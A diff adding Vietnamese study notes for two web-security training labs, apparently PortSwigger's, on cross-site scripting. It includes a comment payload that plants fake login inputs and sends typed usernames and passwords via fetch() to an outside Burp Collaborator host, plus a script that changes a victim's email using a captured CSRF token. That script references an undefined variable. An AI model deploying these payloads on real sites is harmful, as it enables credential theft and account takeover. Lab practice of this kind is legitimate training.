@@ -775,5 +775,77 @@ Host: 1877dlq2gnq6usllkj9gm1a9q0wrkk89.oastify.com
 ```
 - Dùng **Cookie Editor extension**, import cookie vừa lấy được
 
+### Lab: Exploiting cross-site scripting to capture passwords
+#### Check if XSS can be excuted
+- Bình luận với comment sau:
+```
+<img src=1 onerror=alert(1)>
+```
+- Kiểm tra và thấy có thể thưc thi được XSS
+
+#### Exploit
+- Yêu cầu lab: lấy `username` và `password` của `victim`
+- Có thể lấy được cookie nhưng không biết được `username` và `password`
+- Ý tưởng: Tạo ra các input để người dùng đăng nhập, thông tin đăng nhập được gửi đến **Burp Colloborator**
+- Sử dụng payload sau, thêm vào phần comment:
+```html
+<input id="username" name="username">
+<input name="password" id="password" type=password onchange="fetch('https://u1w2d8tifqjl6ctkb0t9xvb35ublzcn1.oastify.com',{method:'POST',mode:'no-cors',body:username.value+'|||'+this.value})">
+```
+- Tạo 2 thẻ input đề người dùng nhập `username` và `password`
+- Dựa trên sự kiện `onchange` khi nhập password để gửi thông tin ra ngoài
+
+### Lab: Exploiting XSS to bypass CSRF defenses
+#### Testing application
+- Đăng nhập bằng tài khoản được cấp
+- Thử chức năng `change email`
+    - Email thay đổi trức tiếp
+    - Không qua mail gửi về
+    - Thay đổi dựa trên `csrf` và `email` mới
+
+```http
+POST /my-account/change-email HTTP/2
+Host: 0ad9001703b71fdf80dfbc93007800f1.web-security-academy.net
+Cookie: session=tZBtLv5KUDWGFPAqF6WJfmMcB8WUz4CQ
+
+...
+
+email=abc%40gmail.com&csrf=Cyy6dLC1N01l3X3ywyfToo7mUMF7aXtM
+```
+
+#### Exploit
+Ý tưởng: 
+- `fetch()` đến `0ad9001703b71fdf80dfbc93007800f1.web-security-academy.net/my-account/change-email`
+- Gửi kèm `email` và `csrf` trong phần body
+
+Inspect code:
+- Khi truy cập vào `/myaccount` ta nhận được 
+```html
+<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
+    <label>Email</label>
+    <input required type="email" name="email" value="">
+    <input required type="hidden" name="csrf" value="uxTjWcfTRnF53nSeDVwYUP5FE5Xl6KP9">
+    <button class='button' type='submit'> Update email </button>
+</form>
+```
+- Sử dụng giá trị `csrf` kết hợp với `email` mới, gửi request POST đến `/my-account/change-email`
+- Như các lab trên, có thể thực thi được tất cả loại thẻ, kết cả `<script>`. Vì vậy tả áp dụng để thực thi **XSS**
+
+Code:
+```html
+<script>
+    
+    fetch('/my-account/change-email',{
+        method: 'POST',
+        body: new URLSearchParams({
+            email: 'abc@gmail.com',
+            csrf: csrfToken
+        })
+    });
+</script>
+```
+
+
 ---
 Goodluck! 🍀🍀🍀
+
